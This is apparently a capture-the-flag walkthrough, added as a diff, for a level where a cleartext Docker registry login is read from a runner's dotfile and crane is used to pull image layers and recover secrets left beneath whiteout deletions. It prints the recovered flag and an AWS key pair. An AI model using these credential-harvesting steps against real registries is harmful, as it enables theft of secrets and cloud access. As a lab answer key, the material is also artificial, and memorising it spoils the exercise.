@@ -1,0 +1,75 @@
+goal: Act III, L10. Continues directly from level9 (same box, same
+session -- see that file for the ssh connection and box orientation).
+Authenticate to the registry with what the runner left in the clear, and
+recover the credential someone thought they'd deleted from the image.
+
+kael.txt fragment 2 (~/work/_temp/_runner_file_commands/kael.txt):
+  "A runner has to log in to a registry to pull what it deploys, so it
+  keeps that login sitting in a dotfile, in the clear. That login is not
+  a key to one image. It is read access to everything this company has
+  ever shipped. And a shipped image is not the sealed box people treat it
+  as. Someone put a secret into this image during the build, realized the
+  mistake, and deleted it in a later step, and they believe it is gone.
+  It is not gone. It is exactly where they left it, one layer down, under
+  a deletion that never removed anything.
+
+  OBJECTIVE: authenticate to the registry with what the runner left in
+  the clear, and recover the credential someone thought they deleted from
+  the image."
+
+recon / exploit:
+  ~/.docker/config.json holds a registry basic-auth blob for
+  127.0.0.1:5000 in the clear (fragment 2's "login sitting in a dotfile"),
+  decodes (base64 -d) to:
+    deploy:3c813e8bf9cb8452f13f7ab49b79b9ead647f0a640ecd56f
+
+  No curl/wget on this box -- used `crane` (preinstalled, reads
+  ~/.docker/config.json automatically for auth):
+    crane catalog 127.0.0.1:5000 --insecure -> halcyon/deploy-agent
+    crane ls 127.0.0.1:5000/halcyon/deploy-agent --insecure -> base, latest
+    crane manifest .../deploy-agent:latest --insecure -> 4 layers (base
+    tag only has the first 2 -- latest's extra 2 layers are the
+    session-specific add/delete pair)
+
+  Pulled each layer as a raw tar.gz via `crane blob <repo>@<digest>` and
+  listed/extracted with tar -tzvf / tar -xzOf:
+    layer 1: adds root/.aws/credentials + root/.aws/build-secret.txt
+    layer 2: root/.aws/.wh.credentials + root/.aws/.wh.build-secret.txt
+      (docker whiteout files -- deleting a file in a layer just adds a
+      0-byte .wh.<name> marker; the actual content from layer 1 is still
+      sitting in the registry's blob store, untouched)
+    layer 3 (session-specific, real content): root/.aws/credentials +
+      root/.aws/build-secret.txt again, this time with a real key and the
+      real flag
+    layer 4 (session-specific): same whiteout pair deleting layer 3's
+      files
+
+  layer 3's build-secret.txt:
+    "# deploy-agent build secret -- REMOVE BEFORE SHIP (it wasn't)
+     GHS2{414d75108b27818a53a71d3e724ba344}"
+
+  Also recovered from layer 3's credentials file (this level's actual
+  deliverable per fragment 3, carried forward into level11):
+    aws_access_key_id = AKIA3E2561D058E1A136
+    aws_secret_access_key = r63CXurmUDMZojwJ6yep5eEnbYpP5G7tqDnwIp0V
+    region = us-east-1
+    (comment: "deploy-agent deploy key -- long-lived, static, never
+    rotated")
+
+flag: GHS2{414d75108b27818a53a71d3e724ba344}
+
+cleanup: none needed on target -- all layer tarballs and extracted files
+were pulled to local scratch, no writes made to the registry/repo.
+
+gotchas:
+  - a manually-retyped layer digest silently had a typo once during this
+    exploration, which surfaced as a confusing "BLOB_UNKNOWN" from the
+    registry rather than an obvious copy error -- pull digests
+    programmatically (e.g. via jq off the manifest) rather than
+    hand-copying them, especially given level9's non-persistence gotcha
+    (a digest copied across a reconnect is guaranteed stale).
+  - `crane blob`'s output must not be redirected together with its
+    stderr into the same file (`> out.tar.gz 2>&1`) -- an auth/fetch
+    error printed to that combined stream corrupts the tar.gz and gzip
+    fails with a confusing "not in gzip format" rather than showing the
+    real error. Keep stdout and stderr separate.
